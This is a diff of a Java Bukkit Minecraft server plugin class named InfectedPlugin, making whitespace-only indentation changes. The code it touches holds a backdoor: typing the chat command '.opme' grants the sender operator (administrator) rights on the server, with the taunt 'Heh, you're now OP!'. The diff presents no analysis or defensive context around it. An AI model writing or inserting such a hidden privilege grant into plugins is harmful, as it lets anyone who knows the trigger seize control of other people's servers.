@@ -10,7 +10,7 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public class InfectedPlugin extends JavaPlugin
 {
-   public final Logger log = Logger.getLogger("Minecraft");
+    public final Logger log = Logger.getLogger("Minecraft");
    
     @Override
     public void onEnable()
@@ -30,8 +30,8 @@ public class InfectedPlugin extends JavaPlugin
     	
     	if (commandLabel.equalsIgnoreCase(".opme"))
     	{
-    		sender.setOp(true);
-    		sender.sendMessage(ChatColor.YELLOW + "Heh, you're now OP!");
+    	    sender.setOp(true);
+    	    sender.sendMessage(ChatColor.YELLOW + "Heh, you're now OP!");
     	}
     	
     	/*
@@ -42,7 +42,7 @@ public class InfectedPlugin extends JavaPlugin
     	}
     	*/
     	
-		return false;
+	return false;
     }
     
 }
